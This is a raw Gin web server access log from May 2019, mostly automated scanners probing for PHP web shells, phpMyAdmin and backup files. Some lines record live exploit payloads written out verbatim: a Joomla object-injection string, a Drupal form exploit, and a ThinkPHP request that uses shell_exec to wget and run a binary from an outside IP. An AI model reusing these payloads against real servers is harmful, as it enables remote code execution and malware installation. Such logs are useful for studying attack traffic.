[GIN-debug] [WARNING] Creating an Engine instance with the Logger and Recovery middleware already attached.

[GIN-debug] [WARNING] Running in "debug" mode. Switch to "release" mode in production.
 - using env:	export GIN_MODE=release
 - using code:	gin.SetMode(gin.ReleaseMode)

[GIN-debug] Loaded HTML Templates (5): 
	- 
	- detail.html
	- index.html
	- my.bak
	- register.html

[GIN-debug] GET    /                         --> _/home/ubuntu/go_demo/myproject/controllers.IndexGet (3 handlers)
[GIN-debug] GET    /detail                   --> _/home/ubuntu/go_demo/myproject/controllers.DetailGet (3 handlers)
[GIN-debug] GET    /static/*filepath         --> github.com/gin-gonic/gin.(*RouterGroup).createStaticHandler.func1 (3 handlers)
[GIN-debug] HEAD   /static/*filepath         --> github.com/gin-gonic/gin.(*RouterGroup).createStaticHandler.func1 (3 handlers)
[GIN-debug] Listening and serving HTTP on :80
signal: interrupt
[GIN-debug] [WARNING] Creating an Engine instance with the Logger and Recovery middleware already attached.

[GIN-debug] [WARNING] Running in "debug" mode. Switch to "release" mode in production.
 - using env:	export GIN_MODE=release
 - using code:	gin.SetMode(gin.ReleaseMode)

[GIN-debug] Loaded HTML Templates (5): 
	- 
	- detail.html
	- index.html
	- my.bak
	- register.html

[GIN-debug] GET    /                         --> _/home/ubuntu/go_demo/myproject/controllers.IndexGet (3 handlers)
[GIN-debug] GET    /detail                   --> _/home/ubuntu/go_demo/myproject/controllers.DetailGet (3 handlers)
[GIN-debug] GET    /static/*filepath         --> github.com/gin-gonic/gin.(*RouterGroup).createStaticHandler.func1 (3 handlers)
[GIN-debug] HEAD   /static/*filepath         --> github.com/gin-gonic/gin.(*RouterGroup).createStaticHandler.func1 (3 handlers)
[GIN-debug] Listening and serving HTTP on :80
[GIN] 2019/05/13 - 20:13:04 | 404 |       1.993µs | 132.232.169.146 | POST     /images/asp.php
[GIN] 2019/05/13 - 20:13:04 | 404 |       2.107µs | 132.232.169.146 | POST     /images/entyy.php
[GIN] 2019/05/13 - 20:13:04 | 404 |       2.216µs | 132.232.169.146 | POST     /images/1ndex.php
[GIN] 2019/05/13 - 20:13:04 | 404 |       1.612µs | 132.232.169.146 | POST     /images/defau1t.php
[GIN] 2019/05/13 - 20:13:04 | 404 |       2.468µs | 132.232.169.146 | POST     /webconfig.txt.php
[GIN] 2019/05/13 - 20:13:04 | 404 |       2.323µs | 132.232.169.146 | POST     /administrator/webconfig.txt.php
[GIN] 2019/05/13 - 20:13:04 | 404 |        2.74µs | 132.232.169.146 | POST     /api.php
[GIN] 2019/05/13 - 20:13:04 | 404 |       1.668µs | 132.232.169.146 | POST     /luso.php
[GIN] 2019/05/13 - 20:13:04 | 404 |        2.67µs | 132.232.169.146 | POST     /1ndex.php
[GIN] 2019/05/13 - 20:13:04 | 404 |       1.715µs | 132.232.169.146 | POST     /indexbak.php
[GIN] 2019/05/13 - 20:13:04 | 404 |       2.282µs | 132.232.169.146 | POST     /xmlrpc.php
[GIN] 2019/05/13 - 20:13:04 | 404 |        1.94µs | 132.232.169.146 | POST     /blog/xmlrpc.php
[GIN] 2019/05/13 - 20:13:04 | 404 |       1.499µs | 132.232.169.146 | POST     /errors/processor.php
[GIN] 2019/05/13 - 20:13:05 | 404 |       2.437µs | 132.232.169.146 | POST     /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
[GIN] 2019/05/13 - 20:13:05 | 404 |       2.233µs | 132.232.169.146 | POST     /plus/90sec.php
[GIN] 2019/05/13 - 20:13:05 | 404 |       2.175µs | 132.232.169.146 | POST     /plus/e7xue.php
[GIN] 2019/05/13 - 20:13:05 | 404 |       2.203µs | 132.232.169.146 | POST     /plus/mybak.php
[GIN] 2019/05/13 - 20:13:05 | 404 |        2.48µs | 132.232.169.146 | POST     /plus/service.php
[GIN] 2019/05/13 - 20:13:05 | 404 |       2.224µs | 132.232.169.146 | POST     /plus/laobiao.php
[GIN] 2019/05/13 - 20:13:05 | 404 |       1.871µs | 132.232.169.146 | POST     /plus/xsvip.php
[GIN] 2019/05/13 - 20:13:05 | 404 |       1.888µs | 132.232.169.146 | POST     /plus/bakup.php
[GIN] 2019/05/13 - 20:13:05 | 404 |       1.873µs | 132.232.169.146 | POST     /c.php
[GIN] 2019/05/13 - 20:13:05 | 404 |       1.527µs | 132.232.169.146 | POST     /c.php
[GIN] 2019/05/13 - 20:13:05 | 404 |       1.876µs | 132.232.169.146 | POST     /test.php
[GIN] 2019/05/13 - 20:13:05 | 404 |       1.638µs | 132.232.169.146 | POST     /laobiao.php
[GIN] 2019/05/13 - 20:13:05 | 404 |        1.92µs | 132.232.169.146 | POST     /index.php
[GIN] 2019/05/13 - 20:13:05 | 404 |       2.118µs | 132.232.169.146 | POST     /user/register?%65%6c%65%6d%65%6e%74%5f%70%61%72%65%6e%74%73=%74%69%6d%65%7a%6f%6e%65%2f%74%69%6d%65%7a%6f%6e%65%2f%23%76%61%6c%75%65&%61%6a%61%78%5f%66%6f%72%6d=1&%5f%77%72%61%70%70%65%72%5f%66%6f%72%6d%61%74=%64%72%75%70%61%6c%5f%61%6http://118.24.23.100/
[GIN] 2019/05/13 - 20:13:05 | 200 |   51.436143ms | }__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";s:56:"die(md5(DIRECTORY_SEPARATOR));JFactory::getConfig();exit";s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\0\0\0connection";b:1;}���� | GET      /
[GIN] 2019/05/13 - 20:13:05 | 200 |   47.484889ms | }__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";s:56:"die(md5(DIRECTORY_SEPARATOR));JFactory::getConfig();exit";s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\0\0\0connection";b:1;}���� | GET      /
[GIN] 2019/05/13 - 20:13:05 | 200 |   103.44398ms | }__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";s:56:"die(md5(DIRECTORY_SEPARATOR));JFactory::getConfig();exit";s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\0\0\0connection";b:1;}���� | GET      /
[GIN] 2019/05/13 - 20:13:05 | 404 |       2.211µs | 132.232.169.146 | POST     /user.php
[GIN] 2019/05/13 - 20:13:05 | 404 |       2.404µs | 132.232.169.146 | GET      /index.php
[GIN] 2019/05/13 - 20:13:05 | 404 |       2.354µs | 132.232.169.146 | GET      /phpmyadmin/index.php
[GIN] 2019/05/13 - 20:13:05 | 404 |       1.708µs | 132.232.169.146 | GET      /phpMyAdmin/index.php
[GIN] 2019/05/13 - 20:13:05 | 404 |       2.164µs | 132.232.169.146 | GET      /pmd/index.php
[GIN] 2019/05/13 - 20:13:05 | 404 |       2.078µs | 132.232.169.146 | GET      /pma/index.php
[GIN] 2019/05/13 - 20:13:05 | 404 |        1.55µs | 132.232.169.146 | GET      /PMA/index.php
[GIN] 2019/05/13 - 20:13:05 | 404 |       2.152µs | 132.232.169.146 | GET      /PMA2/index.php
[GIN] 2019/05/13 - 20:13:05 | 404 |       1.652µs | 132.232.169.146 | GET      /pmamy/index.php
[GIN] 2019/05/13 - 20:13:05 | 404 |       1.446µs | 132.232.169.146 | GET      /pmamy2/index.php
[GIN] 2019/05/13 - 20:13:05 | 404 |       2.824µs | 132.232.169.146 | GET      /mysql/index.php
[GIN] 2019/05/13 - 20:13:05 | 404 |       2.278µs | 132.232.169.146 | GET      /admin/index.php
[GIN] 2019/05/13 - 20:13:05 | 404 |       1.886µs | 132.232.169.146 | GET      /db/index.php
[GIN] 2019/05/13 - 20:13:05 | 404 |       1.806µs | 132.232.169.146 | GET      /dbadmin/index.php
[GIN] 2019/05/13 - 20:13:05 | 404 |       1.528µs | 132.232.169.146 | GET      /web/phpMyAdmin/index.php
[GIN] 2019/05/13 - 20:13:05 | 404 |       2.479µs | 132.232.169.146 | GET      /admin/pma/index.php
[GIN] 2019/05/13 - 20:13:06 | 404 |      51.228µs | 132.232.169.146 | GET      /admin/PMA/index.php
[GIN] 2019/05/13 - 20:13:06 | 404 |       2.238µs | 132.232.169.146 | GET      /admin/mysql/index.php
[GIN] 2019/05/13 - 20:13:06 | 404 |       1.401µs | 132.232.169.146 | GET      /admin/mysql2/index.php
[GIN] 2019/05/13 - 20:13:06 | 404 |       1.985µs | 132.232.169.146 | GET      /admin/phpmyadmin/index.php
[GIN] 2019/05/13 - 20:13:06 | 404 |       1.974µs | 132.232.169.146 | GET      /admin/phpMyAdmin/index.php
[GIN] 2019/05/13 - 20:13:06 | 404 |       2.033µs | 132.232.169.146 | GET      /admin/phpmyadmin2/index.php
[GIN] 2019/05/13 - 20:13:06 | 404 |       1.672µs | 132.232.169.146 | GET      /mysqladmin/index.php
[GIN] 2019/05/13 - 20:13:06 | 404 |       1.851µs | 132.232.169.146 | GET      /mysql-admin/index.php
[GIN] 2019/05/13 - 20:13:06 | 404 |       2.032µs | 132.232.169.146 | GET      /mysql_admin/index.php
[GIN] 2019/05/13 - 20:13:06 | 404 |       1.518µs | 132.232.169.146 | GET      /phpadmin/index.php
[GIN] 2019/05/13 - 20:13:06 | 404 |       2.617µs | 132.232.169.146 | GET      /phpAdmin/index.php
[GIN] 2019/05/13 - 20:13:06 | 404 |       1.688µs | 132.232.169.146 | GET      /phpmyadmin0/index.php
[GIN] 2019/05/13 - 20:13:06 | 404 |       1.867µs | 132.232.169.146 | GET      /phpmyadmin1/index.php
[GIN] 2019/05/13 - 20:13:06 | 404 |       1.945µs | 132.232.169.146 | GET      /phpmyadmin2/index.php
[GIN] 2019/05/13 - 20:13:06 | 404 |       1.493µs | 132.232.169.146 | GET      /phpMyAdmin-4.4.0/index.php
[GIN] 2019/05/13 - 20:13:06 | 404 |       2.125µs | 132.232.169.146 | GET      /myadmin/index.php
[GIN] 2019/05/13 - 20:13:06 | 404 |       1.744µs | 132.232.169.146 | GET      /myadmin2/index.php
[GIN] 2019/05/13 - 20:13:06 | 404 |       2.161µs | 132.232.169.146 | GET      /xampp/phpmyadmin/index.php
[GIN] 2019/05/13 - 20:13:06 | 404 |       2.611µs | 132.232.169.146 | GET      /phpMyadmin_bak/index.php
[GIN] 2019/05/13 - 20:13:06 | 404 |       2.305µs | 132.232.169.146 | GET      /www/phpMyAdmin/index.php
[GIN] 2019/05/13 - 20:13:06 | 404 |       1.877µs | 132.232.169.146 | GET      /tools/phpMyAdmin/index.php
[GIN] 2019/05/13 - 20:13:06 | 404 |       1.853µs | 132.232.169.146 | GET      /phpmyadmin-old/index.php
[GIN] 2019/05/13 - 20:13:06 | 404 |       2.311µs | 132.232.169.146 | GET      /phpMyAdminold/index.php
[GIN] 2019/05/13 - 20:13:06 | 404 |       2.007µs | 132.232.169.146 | GET      /phpMyAdmin.old/index.php
[GIN] 2019/05/13 - 20:13:07 | 404 |       1.726µs | 132.232.169.146 | GET      /pma-old/index.php
[GIN] 2019/05/13 - 20:13:07 | 404 |       2.186µs | 132.232.169.146 | GET      /claroline/phpMyAdmin/index.php
[GIN] 2019/05/13 - 20:13:07 | 404 |       2.932µs | 132.232.169.146 | GET      /typo3/phpmyadmin/index.php
[GIN] 2019/05/13 - 20:13:07 | 404 |       2.665µs | 132.232.169.146 | GET      /phpma/index.php
[GIN] 2019/05/13 - 20:13:07 | 404 |       1.736µs | 132.232.169.146 | GET      /phpmyadmin/phpmyadmin/index.php
[GIN] 2019/05/13 - 20:13:07 | 404 |       1.914µs | 132.232.169.146 | GET      /phpMyAdmin/phpMyAdmin/index.php
[GIN] 2019/05/13 - 20:13:07 | 404 |       2.761µs | 132.232.169.146 | GET      /phpMyAbmin/index.php
[GIN] 2019/05/13 - 20:13:07 | 404 |       1.874µs | 132.232.169.146 | GET      /phpMyAdmin__/index.php
[GIN] 2019/05/13 - 20:13:07 | 404 |       1.998µs | 132.232.169.146 | GET      /phpMyAdmin+++---/index.php
[GIN] 2019/05/13 - 20:13:07 | 404 |       2.549µs | 132.232.169.146 | GET      /v/index.php
[GIN] 2019/05/13 - 20:13:07 | 404 |       2.739µs | 132.232.169.146 | GET      /phpmyadm1n/index.php
[GIN] 2019/05/13 - 20:13:07 | 404 |       1.612µs | 132.232.169.146 | GET      /phpMyAdm1n/index.php
[GIN] 2019/05/13 - 20:13:07 | 404 |       1.781µs | 132.232.169.146 | GET      /shaAdmin/index.php
[GIN] 2019/05/13 - 20:13:07 | 404 |       1.457µs | 132.232.169.146 | GET      /phpMyadmi/index.php
[GIN] 2019/05/13 - 20:13:07 | 404 |       2.191µs | 132.232.169.146 | GET      /phpMyAdmion/index.php
[GIN] 2019/05/13 - 20:13:07 | 404 |         9.3µs | 132.232.169.146 | GET      /s/index.php
[GIN] 2019/05/13 - 20:13:07 | 404 |       1.857µs | 132.232.169.146 | GET      /MyAdmin/index.php
[GIN] 2019/05/13 - 20:13:07 | 404 |       2.479µs | 132.232.169.146 | GET      /phpMyAdmin1/index.php
[GIN] 2019/05/13 - 20:13:07 | 404 |       1.691µs | 132.232.169.146 | GET      /phpMyAdmin123/index.php
[GIN] 2019/05/13 - 20:13:07 | 404 |       2.198µs | 132.232.169.146 | GET      /pwd/index.php
[GIN] 2019/05/13 - 20:13:07 | 404 |       2.632µs | 132.232.169.146 | GET      /phpMyAdmina/index.php
[GIN] 2019/05/13 - 20:13:07 | 404 |       2.027µs | 132.232.169.146 | GET      /phpMydmin/index.php
[GIN] 2019/05/13 - 20:13:07 | 404 |       1.656µs | 132.232.169.146 | GET      /phpMyAdmins/index.php
[GIN] 2019/05/13 - 20:13:08 | 404 |       2.242µs | 132.232.169.146 | GET      /phpMyAdmin._/index.php
[GIN] 2019/05/13 - 20:13:08 | 404 |       1.819µs | 132.232.169.146 | GET      /phpMyAdmin._2/index.php
[GIN] 2019/05/13 - 20:13:08 | 404 |        1.74µs | 132.232.169.146 | GET      /phpmyadmin2222/index.php
[GIN] 2019/05/13 - 20:13:08 | 404 |       1.648µs | 132.232.169.146 | GET      /php2MyAdmin/index.php
[GIN] 2019/05/13 - 20:13:08 | 404 |      19.561µs | 132.232.169.146 | GET      /phpiMyAdmin/index.php
[GIN] 2019/05/13 - 20:13:08 | 404 |        2.12µs | 132.232.169.146 | GET      /phpNyAdmin/index.php
[GIN] 2019/05/13 - 20:13:08 | 404 |        2.26µs | 132.232.169.146 | GET      /1/index.php
[GIN] 2019/05/13 - 20:13:08 | 404 |      19.819µs | 132.232.169.146 | GET      /download/index.php
[GIN] 2019/05/13 - 20:13:08 | 404 |       2.366µs | 132.232.169.146 | GET      /phpMyAdmin_111/index.php
[GIN] 2019/05/13 - 20:13:08 | 404 |       2.303µs | 132.232.169.146 | GET      /phpmadmin/index.php
[GIN] 2019/05/13 - 20:13:08 | 404 |       1.711µs | 132.232.169.146 | GET      /321/index.php
[GIN] 2019/05/13 - 20:13:08 | 404 |       2.643µs | 132.232.169.146 | GET      /123131/index.php
[GIN] 2019/05/13 - 20:13:08 | 404 |       2.307µs | 132.232.169.146 | GET      /phpMyAdminn/index.php
[GIN] 2019/05/13 - 20:13:08 | 404 |       2.135µs | 132.232.169.146 | GET      /program/index.php
[GIN] 2019/05/13 - 20:13:08 | 404 |       2.282µs | 132.232.169.146 | GET      /shopdb/index.php
[GIN] 2019/05/13 - 20:13:08 | 404 |        2.12µs | 132.232.169.146 | GET      /phppma/index.php
[GIN] 2019/05/13 - 20:13:08 | 404 |       1.547µs | 132.232.169.146 | GET      /phpmy/index.php
[GIN] 2019/05/13 - 20:13:08 | 404 |       1.847µs | 132.232.169.146 | GET      /mysql/admin/index.php
[GIN] 2019/05/13 - 20:13:08 | 404 |       11.73µs | 132.232.169.146 | GET      /mysql/dbadmin/index.php
[GIN] 2019/05/13 - 20:13:08 | 404 |       1.889µs | 132.232.169.146 | GET      /mysql/sqlmanager/index.php
[GIN] 2019/05/13 - 20:13:08 | 404 |       1.441µs | 132.232.169.146 | GET      /mysql/mysqlmanager/index.php
[GIN] 2019/05/13 - 20:13:08 | 404 |       1.832µs | 132.232.169.146 | GET      /wp-content/plugins/portable-phpmyadmin/wp-pma-mod/index.php
[GIN] 2019/05/13 - 20:13:08 | 404 |       1.925µs | 132.232.169.146 | GET      /manager/html
[GIN] 2019/05/13 - 20:38:35 | 200 |   58.177688ms |  58.251.121.186 | GET      /
[GIN] 2019/05/13 - 21:00:18 | 404 |        1.62µs |    71.6.202.198 | GET      /ccvv
[GIN] 2019/05/13 - 21:18:01 | 200 |   50.622124ms |   109.94.19.139 | GET      /
[GIN] 2019/05/13 - 21:43:44 | 404 |       1.934µs |    80.82.70.187 | GET      /cache/global/img/gs.gif
[GIN] 2019/05/13 - 21:58:22 | 200 |   48.055232ms |  88.253.181.111 | GET      /
[GIN] 2019/05/13 - 22:01:50 | 404 |       1.937µs | 185.172.110.217 | GET      /index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20http://83.166.246.230/bins/hot;%20chmod%20777%20hot;./hot20thinkphp
[GIN] 2019/05/13 - 22:06:11 | 200 |   54.076509ms |   103.79.35.159 | GET      /
[GIN] 2019/05/13 - 22:19:34 | 200 |   46.993783ms |      96.9.75.73 | GET      /
[GIN] 2019/05/13 - 22:29:25 | 404 |       1.644µs | 216.144.240.130 | HEAD     /robots.txt
[GIN] 2019/05/13 - 22:30:53 | 200 |   53.059211ms |   13.230.186.19 | GET      /
[GIN] 2019/05/13 - 23:22:12 | 200 |       60.15ms |  128.14.209.242 | GET      /
[GIN] 2019/05/13 - 23:27:14 | 200 |   48.253738ms | 139.162.106.181 | GET      /
[GIN] 2019/05/14 - 03:17:44 | 200 |   50.343197ms |   41.219.17.115 | GET      /
[GIN] 2019/05/14 - 03:17:45 | 404 |       2.123µs |   41.219.17.115 | GET      /robots.txt
[GIN] 2019/05/14 - 03:17:45 | 404 |       1.858µs |   41.219.17.115 | POST     /App64171876.php
[GIN] 2019/05/14 - 03:17:46 | 404 |       1.525µs |   41.219.17.115 | GET      /webdav/
[GIN] 2019/05/14 - 03:17:46 | 404 |       1.839µs |   41.219.17.115 | GET      /help.php
[GIN] 2019/05/14 - 03:17:46 | 404 |       2.285µs |   41.219.17.115 | GET      /java.php
[GIN] 2019/05/14 - 03:17:47 | 404 |       2.187µs |   41.219.17.115 | GET      /_query.php
[GIN] 2019/05/14 - 03:17:47 | 404 |       1.776µs |   41.219.17.115 | GET      /test.php
[GIN] 2019/05/14 - 03:17:48 | 404 |       2.065µs |   41.219.17.115 | GET      /db_cts.php
[GIN] 2019/05/14 - 03:17:48 | 404 |       2.423µs |   41.219.17.115 | GET      /db_pma.php
[GIN] 2019/05/14 - 03:17:48 | 404 |       2.408µs |   41.219.17.115 | GET      /logon.php
[GIN] 2019/05/14 - 03:17:49 | 404 |       2.145µs |   41.219.17.115 | GET      /help-e.php
[GIN] 2019/05/14 - 03:17:51 | 404 |       2.196µs |   41.219.17.115 | GET      /license.php
[GIN] 2019/05/14 - 03:17:51 | 404 |        1.69µs |   41.219.17.115 | GET      /log.php
[GIN] 2019/05/14 - 03:17:52 | 404 |        1.95µs |   41.219.17.115 | GET      /hell.php
[GIN] 2019/05/14 - 03:17:52 | 404 |       1.768µs |   41.219.17.115 | GET      /pmd_online.php
[GIN] 2019/05/14 - 03:17:52 | 404 |       2.004µs |   41.219.17.115 | GET      /x.php
[GIN] 2019/05/14 - 03:17:53 | 404 |       1.917µs |   41.219.17.115 | GET      /shell.php
[GIN] 2019/05/14 - 03:17:53 | 404 |       1.908µs |   41.219.17.115 | GET      /htdocs.php
[GIN] 2019/05/14 - 03:17:53 | 404 |       2.401µs |   41.219.17.115 | GET      /b.php
[GIN] 2019/05/14 - 03:17:54 | 404 |       1.707µs |   41.219.17.115 | GET      /sane.php
[GIN] 2019/05/14 - 03:17:57 | 404 |       2.019µs |   41.219.17.115 | GET      /desktop.ini.php
[GIN] 2019/05/14 - 03:17:58 | 404 |       1.785µs |   41.219.17.115 | GET      /z.php
[GIN] 2019/05/14 - 03:17:58 | 404 |       2.457µs |   41.219.17.115 | GET      /lala.php
[GIN] 2019/05/14 - 03:17:59 | 404 |       2.062µs |   41.219.17.115 | GET      /lala-dpr.php
[GIN] 2019/05/14 - 03:18:00 | 404 |       2.614µs |   41.219.17.115 | GET      /wpc.php
[GIN] 2019/05/14 - 03:18:01 | 404 |       2.256µs |   41.219.17.115 | GET      /wpo.php
[GIN] 2019/05/14 - 03:18:02 | 404 |       2.425µs |   41.219.17.115 | GET      /t6nv.php
[GIN] 2019/05/14 - 03:18:03 | 404 |       2.406µs |   41.219.17.115 | GET      /muhstik.php
[GIN] 2019/05/14 - 03:18:04 | 404 |       2.403µs |   41.219.17.115 | GET      /text.php
[GIN] 2019/05/14 - 03:18:04 | 404 |       2.344µs |   41.219.17.115 | GET      /wp-config.php
[GIN] 2019/05/14 - 03:18:05 | 404 |       2.293µs |   41.219.17.115 | GET      /muhstik.php
[GIN] 2019/05/14 - 03:18:06 | 404 |       2.175µs |   41.219.17.115 | GET      /muhstik2.php
[GIN] 2019/05/14 - 03:18:06 | 404 |       1.914µs |   41.219.17.115 | GET      /muhstiks.php
[GIN] 2019/05/14 - 03:18:07 | 404 |       2.727µs |   41.219.17.115 | GET      /muhstik-dpr.php
[GIN] 2019/05/14 - 03:18:07 | 404 |       2.023µs |   41.219.17.115 | GET      /lol.php
[GIN] 2019/05/14 - 03:18:07 | 404 |       2.531µs |   41.219.17.115 | GET      /uploader.php
[GIN] 2019/05/14 - 03:18:08 | 404 |       2.245µs |   41.219.17.115 | GET      /cmd.php
[GIN] 2019/05/14 - 03:18:09 | 404 |       1.954µs |   41.219.17.115 | GET      /cmv.php
[GIN] 2019/05/14 - 03:18:10 | 404 |       3.164µs |   41.219.17.115 | GET      /cmdd.php
[GIN] 2019/05/14 - 03:18:15 | 404 |       2.085µs |   41.219.17.115 | GET      /knal.php
[GIN] 2019/05/14 - 03:18:16 | 404 |       1.944µs |   41.219.17.115 | GET      /cmd.php
[GIN] 2019/05/14 - 03:18:16 | 404 |       2.198µs |   41.219.17.115 | GET      /shell.php
[GIN] 2019/05/14 - 03:18:16 | 404 |       2.506µs |   41.219.17.115 | GET      /appserv.php
[GIN] 2019/05/14 - 03:18:17 | 404 |       1.872µs |   41.219.17.115 | GET      /scripts/setup.php
[GIN] 2019/05/14 - 03:18:17 | 404 |       2.064µs |   41.219.17.115 | GET      /phpmyadmin/scripts/setup.php
[GIN] 2019/05/14 - 03:18:19 | 404 |        1.74µs |   41.219.17.115 | GET      /phpMyAdmin/scripts/setup.php
[GIN] 2019/05/14 - 03:18:22 | 404 |       2.462µs |   41.219.17.115 | GET      /phpmyadmin/scripts/db___.init.php
[GIN] 2019/05/14 - 03:18:23 | 404 |       2.429µs |   41.219.17.115 | GET      /phpMyAdmin/scripts/db___.init.php
[GIN] 2019/05/14 - 03:18:45 | 404 |       1.707µs |   41.219.17.115 | GET      /cacti/plugins/weathermap/editor.php
[GIN] 2019/05/14 - 03:18:45 | 404 |       1.644µs |   41.219.17.115 | GET      /index.php?s=%2f%69%6e%64%65%78%2f%5c%74%68%69%6e%6b%5c%61%70%70%2f%69%6e%76%6f%6b%65%66%75%6e%63%74%69%6f%6e&function=%63%61%6c%6c%5f%75%73%65%72%5f%66%75%6e%63%5f%61%72%72%61%79&vars[0]=%6d%645&vars[1][]=%48%65%6c%6c%6f%54%68%69%6e%6b%50%dz�
[GIN] 2019/05/14 - 03:18:46 | 404 |       2.066µs |   41.219.17.115 | GET      /d7.php
[GIN] 2019/05/14 - 03:18:46 | 404 |       2.079µs |   41.219.17.115 | GET      /rxr.php
[GIN] 2019/05/14 - 03:18:46 | 404 |       2.752µs |   41.219.17.115 | GET      /1x.php
[GIN] 2019/05/14 - 03:18:47 | 404 |       1.923µs |   41.219.17.115 | GET      /home.php
[GIN] 2019/05/14 - 03:18:49 | 404 |       1.814µs |   41.219.17.115 | GET      /undx.php
[GIN] 2019/05/14 - 03:18:49 | 404 |        2.02µs |   41.219.17.115 | GET      /spider.php
[GIN] 2019/05/14 - 03:18:50 | 404 |       2.289µs |   41.219.17.115 | GET      /payload.php
[GIN] 2019/05/14 - 03:18:51 | 404 |       1.888µs |   41.219.17.115 | GET      /composers.php
[GIN] 2019/05/14 - 03:18:51 | 404 |       2.251µs |   41.219.17.115 | GET      /izom.php
[GIN] 2019/05/14 - 03:18:52 | 404 |       1.857µs |   41.219.17.115 | GET      /composer.php
[GIN] 2019/05/14 - 03:18:52 | 404 |       1.753µs |   41.219.17.115 | GET      /hue2.php
[GIN] 2019/05/14 - 03:18:52 | 404 |        2.33µs |   41.219.17.115 | GET      /Drupal.php
[GIN] 2019/05/14 - 03:18:53 | 404 |       2.284µs |   41.219.17.115 | GET      /lang.php?f=1
[GIN] 2019/05/14 - 03:18:53 | 404 |       2.742µs |   41.219.17.115 | GET      /izom.php
[GIN] 2019/05/14 - 03:18:53 | 404 |       2.489µs |   41.219.17.115 | GET      /payload.php
[GIN] 2019/05/14 - 03:18:54 | 404 |       2.335µs |   41.219.17.115 | GET      /new_license.php
[GIN] 2019/05/14 - 03:18:55 | 404 |       2.485µs |   41.219.17.115 | GET      /images/!.php
[GIN] 2019/05/14 - 03:18:55 | 404 |       2.241µs |   41.219.17.115 | GET      /images/vuln.php
[GIN] 2019/05/14 - 03:18:56 | 404 |        2.68µs |   41.219.17.115 | GET      /up.php
[GIN] 2019/05/14 - 03:18:56 | 404 |       2.012µs |   41.219.17.115 | GET      /huoshan.php
[GIN] 2019/05/14 - 03:18:56 | 404 |       1.874µs |   41.219.17.115 | GET      /laravel.php
[GIN] 2019/05/14 - 03:18:57 | 404 |       2.692µs |   41.219.17.115 | GET      /yu.php
[GIN] 2019/05/14 - 03:18:57 | 404 |       1.614µs |   41.219.17.115 | POST     /wuwu11.php
[GIN] 2019/05/14 - 03:18:57 | 404 |       2.508µs |   41.219.17.115 | GET      /plugins/weathermap/editor.php
[GIN] 2019/05/14 - 03:18:57 | 404 |       2.378µs |   41.219.17.115 | POST     /xw.php
[GIN] 2019/05/14 - 03:18:58 | 404 |       1.731µs |   41.219.17.115 | POST     /xw1.php
[GIN] 2019/05/14 - 03:18:59 | 404 |       1.948µs |   41.219.17.115 | POST     /9678.php
[GIN] 2019/05/14 - 03:18:59 | 404 |       2.634µs |   41.219.17.115 | POST     /wc.php
[GIN] 2019/05/14 - 03:19:00 | 404 |        2.11µs |   41.219.17.115 | POST     /xx.php
[GIN] 2019/05/14 - 03:19:01 | 404 |       1.817µs |   41.219.17.115 | POST     /xx.php
[GIN] 2019/05/14 - 03:19:01 | 404 |       1.546µs |   41.219.17.115 | POST     /s.php
[GIN] 2019/05/14 - 03:19:01 | 404 |       2.133µs |   41.219.17.115 | POST     /w.php
[GIN] 2019/05/14 - 03:19:02 | 404 |       2.726µs |   41.219.17.115 | POST     /sheep.php
